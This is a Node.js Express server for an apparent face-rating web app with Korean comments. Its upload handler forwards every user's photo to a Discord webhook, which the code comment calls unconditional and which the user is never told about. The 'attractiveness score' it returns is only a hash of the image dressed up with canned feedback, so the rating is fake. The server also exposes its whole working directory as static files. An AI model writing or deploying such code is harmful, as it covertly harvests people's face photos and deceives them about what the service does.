import express from "express";
import multer from "multer";
import fs from "fs";
import path from "path";
import fetch from "node-fetch";
import crypto from "crypto";

const app = express();
const PORT = process.env.PORT || 10000;
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

/* 업로드 설정 */
const uploadDir = "./uploads";
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
const upload = multer({ dest: uploadDir });

app.use(express.static("./"));

app.get("/", (req, res) => {
  res.sendFile(path.resolve("index.html"));
});

app.post("/upload", upload.single("photo"), async (req, res) => {
  const filePath = req.file.path;

  /* 1️⃣ 디스코드로 사진 무조건 전송 */
  try {
    const form = new FormData();
    form.append("file", fs.createReadStream(filePath));

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form
    });
  } catch (e) {
    console.error("디스코드 전송 실패:", e.message);
  }

  /* 2️⃣ 사진 기반 고정 점수 생성 */
  const buffer = fs.readFileSync(filePath);
  const hash = crypto.createHash("sha256").update(buffer).digest("hex");
  const base = parseInt(hash.slice(0, 8), 16);

  const score = Math.round((5 + (base % 50) / 10) * 10) / 10; // 5.0~10.0
  const percent = Math.min(99, Math.round((score / 10) * 100));

  let feedback = "";
  if (score >= 9) feedback = "상위권 외모로 매우 강한 인상을 줍니다.";
  else if (score >= 8) feedback = "얼굴 비율이 균형 잡혀 있고 호감형입니다.";
  else if (score >= 7) feedback = "전체적으로 안정적인 인상입니다.";
  else if (score >= 6) feedback = "평균 이상이며 깔끔한 이미지입니다.";
  else feedback = "개성이 분명한 얼굴입니다.";

  /* 3️⃣ 응답 */
  res.json({
    score,
    percent,
    feedback
  });

  /* 4️⃣ 파일 삭제 */
  fs.unlink(filePath, () => {});
});

app.listen(PORT, () => {
  console.log("Server running on", PORT);
});
